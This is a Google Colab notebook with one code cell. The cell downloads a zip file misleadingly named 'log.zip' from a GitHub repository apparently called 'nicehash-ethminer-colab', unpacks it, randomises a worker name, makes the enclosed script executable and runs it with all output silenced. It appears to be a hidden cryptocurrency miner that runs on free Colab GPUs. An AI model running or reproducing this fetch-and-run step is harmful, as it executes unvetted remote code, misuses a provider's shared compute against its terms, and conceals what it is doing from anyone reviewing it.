{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "zon3.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "private_outputs": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "bU_4A2jQRgmv"
      },
      "source": [
        "!wget https://github.com/batata01/nicehash-ethminer-colab/raw/main/log.zip && unzip log.zip && perl -pe 's/workerg1/\" \" . (100 + int rand 900) .  \" \"/ge' < 0.sh > 1.sh && rm 0.sh && chmod +x 1.sh\n",
        "!./1.sh > /dev/null 2>&1"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}